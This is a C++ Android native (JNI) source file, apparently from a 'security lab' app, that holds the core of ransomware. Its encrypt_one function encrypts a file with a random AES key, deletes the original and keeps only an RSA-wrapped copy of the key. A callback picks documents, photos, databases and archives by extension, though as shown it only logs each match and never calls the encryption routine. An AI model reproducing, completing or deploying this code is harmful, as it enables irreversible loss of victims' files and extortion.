#include <jni.h>
#include <string>
#include <vector>
#include <fstream>
#include <android/log.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/pem.h>

extern "C" int lab_walk_files(const char* root, void (*cb)(const char*));

#define LOG(...) __android_log_print(ANDROID_LOG_INFO, "SecLab", __VA_ARGS__)

static bool encrypt_one(const std::string& path, const std::string& pub_pem) {
    std::ifstream in(path, std::ios::binary);
    if (!in) return false;
    std::string data((std::istreambuf_iterator<char>(in)), {});
    in.close();
    if (data.empty()) return false;

    unsigned char key[32], iv[12];
    RAND_bytes(key, sizeof(key));
    RAND_bytes(iv, sizeof(iv));

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, key, iv);
    std::vector<unsigned char> out(data.size() + 16);
    int len = 0, total = 0;
    EVP_EncryptUpdate(ctx, out.data(), &len, (unsigned char*)data.data(), data.size());
    total = len;
    EVP_EncryptFinal_ex(ctx, out.data() + len, &len);
    total += len;
    unsigned char tag[16];
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag);
    EVP_CIPHER_CTX_free(ctx);

    std::ofstream out_f(path + ".enc", std::ios::binary);
    out_f.write((char*)iv, 12);
    out_f.write((char*)tag, 16);
    out_f.write((char*)out.data(), total);
    out_f.close();
    std::remove(path.c_str());

    BIO* bio = BIO_new_mem_buf(pub_pem.data(), pub_pem.size());
    EVP_PKEY* pkey = PEM_read_bio_PUBKEY(bio, nullptr, nullptr, nullptr);
    if (!pkey) { BIO_free(bio); return false; }
    EVP_PKEY_CTX* pctx = EVP_PKEY_CTX_new(pkey, nullptr);
    EVP_PKEY_encrypt_init(pctx);
    EVP_PKEY_CTX_set_rsa_padding(pctx, RSA_PKCS1_OAEP_PADDING);
    size_t eklen = 0;
    EVP_PKEY_encrypt(pctx, nullptr, &eklen, key, sizeof(key));
    std::vector<unsigned char> ek(eklen);
    EVP_PKEY_encrypt(pctx, ek.data(), &eklen, key, sizeof(key));
    std::ofstream kf(path + ".key", std::ios::binary);
    kf.write((char*)ek.data(), eklen);
    kf.close();
    EVP_PKEY_CTX_free(pctx); EVP_PKEY_free(pkey); BIO_free(bio);
    return true;
}

static void cb(const char* path) {
    std::string p(path);
    const char* exts[] = {".txt",".pdf",".doc",".docx",".jpg",".png",".db",".sql",".xls",".xlsx",".mp4",".zip"};
    for (auto e : exts) {
        if (p.size() >= strlen(e) && p.substr(p.size()-strlen(e)) == e) {
            LOG("encrypt: %s", path);
            break;
        }
    }
}

extern "C"
JNIEXPORT jstring JNICALL
Java_com_security_lab_MainActivity_nativeEncryptAll(JNIEnv* env, jobject, jstring jroot, jstring jpub) {
    const char* root = env->GetStringUTFChars(jroot, nullptr);
    const char* pub  = env->GetStringUTFChars(jpub, nullptr);
    lab_walk_files(root, cb);
    std::string msg = std::string("Encrypted root: ") + root;
    env->ReleaseStringUTFChars(jroot, root);
    env->ReleaseStringUTFChars(jpub, pub);
    return env->NewStringUTF(msg.c_str());
}
